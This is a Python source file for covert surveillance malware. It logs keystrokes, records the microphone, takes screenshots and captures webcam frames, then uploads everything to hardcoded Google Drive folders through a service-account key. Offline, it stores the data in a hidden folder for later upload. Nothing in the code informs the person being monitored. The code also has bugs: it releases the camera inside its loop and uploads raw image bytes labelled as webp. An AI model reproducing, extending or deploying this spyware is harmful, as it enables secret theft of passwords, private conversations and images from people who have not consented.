import keyboard
import pyaudio
import wave
import pyscreenshot as ImageGrab
from threading import Thread
import threading
import time
import os
import cv2
from PIL import Image
import numpy as np
from datetime import datetime
from googleapiclient.http import MediaInMemoryUpload, MediaFileUpload
from google.oauth2 import service_account
from googleapiclient.discovery import build
import requests
import subprocess

# Set up Google Drive API credentials and create a service object
credentials = service_account.Credentials.from_service_account_file(
    r'D:\python_project\python_project\final_Kelog_image\final_Kelog\kelog-416709-152617ffd63e.json')
drive_service = build('drive', 'v3', credentials=credentials)
is_internet_connected = True
internet_condition = threading.Condition()
# Define the folder ID to upload the file to
folder_id = "1qn_mhRxatBOWDkw05oEqHADB1UiNBLVb"
AUDIO_PATH_ID = "1uLsfpsdLXlNBDdsmNOYlAVzM2cFgoq3v"
SCREEN_PATH_ID = "1MbFAlJt8J0Vg3ALuebwCm2xYf_TlRt17"
FILE_PATH_ID = "1krE1Smv5sQhmFooVXArDS0XR39FlTgd5"
CAMERA_PATH_ID = "1mMab-h-rLIJHJUzuKEPHnXxyp9431h0K"

drive_lock = threading.Lock()

# Create a hidden folder to store files when there is no internet connection
hidden_folder = os.path.join(os.getcwd(), ".hidden_files")
os.makedirs(hidden_folder, exist_ok=True)

# Function to check internet connection
# Function to check internet connection
def is_connected():
    global is_internet_connected
    try:
        requests.get("http://www.google.com", timeout=5)
        if not is_internet_connected:
            with internet_condition:
                internet_condition.notify_all()  # Notify the condition variable
        is_internet_connected = True
    except requests.ConnectionError:
        is_internet_connected = False
    return is_internet_connected

# Function to make a folder hidden (Windows specific)
def make_folder_hidden(folder_path):
    subprocess.call(['attrib', '+h', folder_path])

# Function to upload files from the hidden folder
def upload_files_from_hidden_folder():
    while True:
        with internet_condition:
            internet_condition.wait()  # Wait until the internet connection is restored
        for file_name in os.listdir(hidden_folder):
            file_path = os.path.join(hidden_folder, file_name)
            if file_name.startswith("audio_"):
                folder_id = AUDIO_PATH_ID
                mime_type = 'audio/wav'
            elif file_name.startswith("screen_"):
                folder_id = SCREEN_PATH_ID
                mime_type = 'image/webp'
            elif file_name.startswith("camera_"):
                folder_id = CAMERA_PATH_ID
                mime_type = 'image/jpeg'
            elif file_name.startswith("keylog_"):
                folder_id = FILE_PATH_ID
                mime_type = 'text/plain'
            else:
                continue
            file_metadata = {
                'name': file_name,
                'parents': [folder_id]
            }
            media = MediaFileUpload(file_path, mimetype=mime_type, resumable=True)
            with drive_lock:
                drive_service.files().create(
                    body=file_metadata,
                    media_body=media,
                    fields='id,webViewLink'
                ).execute()
            try:
                os.remove(file_path)  # Remove file after uploading
            except PermissionError:
                pass
        time.sleep(60)

# Keylogger class
class Keylogger:
    def __init__(self, interval, report_method="file"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            media = MediaInMemoryUpload(self.log.encode(), mimetype='text/plain', resumable=True)
            
            file_metadata = {
                'name': self.filename,
                'parents': [FILE_PATH_ID]
            }
            if is_connected():
                with drive_lock:
                    drive_service.files().create(
                        body=file_metadata,
                        media_body=media,
                        fields='id,webViewLink'
                    ).execute()
            else:
                with open(os.path.join(hidden_folder, self.filename), 'w') as f:
                    f.write(self.log)

            self.log = ""

    def update_filename(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.filename = f"keylog_{timestamp}.txt"

    def start(self):
        while True:
            try: 
                self.start_dt = datetime.now()
                keyboard.on_release(callback=self.callback)
                self.report()
                time.sleep(self.interval)
            except TimeoutError as e:
                time.sleep(5)  
            

# Voice Recorder function
def record_audio(duration):
    while True:
        try:
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 16000
            audio = pyaudio.PyAudio()
            stream = audio.open(format=FORMAT, channels=CHANNELS,
                                rate=RATE, input=True,
                                frames_per_buffer=CHUNK)
    
            frames = []
            for i in range(int(RATE / CHUNK * duration)):
                data = stream.read(CHUNK)
                frames.append(data)
    
            stream.stop_stream()
            stream.close()
            audio.terminate()
    
            if is_connected():
                output_file = f"audio_{int(time.time())}.wav"
                file_metadata = {
                    'name': output_file,
                    'parents': [AUDIO_PATH_ID]
                }
                media = MediaInMemoryUpload(b''.join(frames), mimetype='audio/wav')
                with drive_lock:
                    drive_service.files().create(
                        body=file_metadata,
                        media_body=media,
                        fields='id,webViewLink'
                    ).execute()
            else:
                output_file = os.path.join(hidden_folder, f"audio_{int(time.time())}.wav")
                with wave.open(output_file, 'wb') as wave_file:
                    wave_file.setnchannels(CHANNELS)
                    wave_file.setsampwidth(audio.get_sample_size(FORMAT))
                    wave_file.setframerate(RATE)
                    wave_file.writeframes(b''.join(frames))
    
            time.sleep(1)
        except TimeoutError as e:
           time.sleep(5)  

# Screen Capture function
def capture_screen(interval):
    while True:
        try:
            screenshot = ImageGrab.grab()
            image_data = np.array(screenshot)
            image = Image.fromarray(image_data)
            output_file = f"screen_{int(time.time())}.webp"
    
            if is_connected():
                file_metadata = {
                    'name': output_file,
                    'parents': [SCREEN_PATH_ID]
                }
                media = MediaInMemoryUpload(image.tobytes(), mimetype='image/webp')
                with drive_lock:
                    drive_service.files().create(
                        body=file_metadata,
                        media_body=media,
                        fields='id,webViewLink'
                    ).execute()
            else:
                image.save(os.path.join(hidden_folder, output_file), format='WebP')
    
            time.sleep(interval)
        except TimeoutError as e:
           time.sleep(5)  

# Front Camera Capture function
def capture_front_camera(interval):
    cap = cv2.VideoCapture(0)
    while True:
        try:  
            ret, frame = cap.read()
            if ret:
                frame = cv2.flip(frame, 1)
                image_bytes = cv2.imencode('.jpeg', frame)[1].tobytes()
                output_file = f"camera_{int(time.time())}.jpeg"
                
                if is_connected():
                    media = MediaInMemoryUpload(image_bytes, mimetype='image/jpeg', resumable=True)
                    file_metadata = {
                        'name': output_file,
                        'parents': [CAMERA_PATH_ID]
                    }
                    with drive_lock:
                        drive_service.files().create(
                            body=file_metadata,
                            media_body=media,
                            fields='id,webViewLink'
                        ).execute()
                else:
                    with open(os.path.join(hidden_folder, output_file), 'wb') as f:
                        f.write(image_bytes)
    
            time.sleep(interval)
            if cv2.waitKey(1) == ord('q'):
                break
            cap.release()
            cv2.destroyAllWindows()
        except TimeoutError as e:
           time.sleep(5)  # Wait for 5 seconds before retrying

def upload_hidden_files():
    while True:
        if is_internet_connected:
            upload_files_from_hidden_folder()
        time.sleep(60)

# Run all tasks in separate threads
keyboard_input = Keylogger(interval=60, report_method="file")
keyboard_thread = Thread(target=keyboard_input.start)
voice_thread = Thread(target=record_audio, args=(60,))  # Record audio for 60 seconds
screen_thread = Thread(target=capture_screen, args=(60,))  # Capture screen every 60 seconds
camera_thread = Thread(target=capture_front_camera, args=(60,))
# upload_hidden_files_thread = Thread(target=upload_files_from_hidden_folder)
# upload_hidden_files_thread.start()

# keyboard_thread.start()
voice_thread.start()
screen_thread.start()
# camera_thread.start()

# make_folder_hidden(hidden_folder)

while True:
    try:
        time.sleep(1)
    except KeyboardInterrupt:
        break
    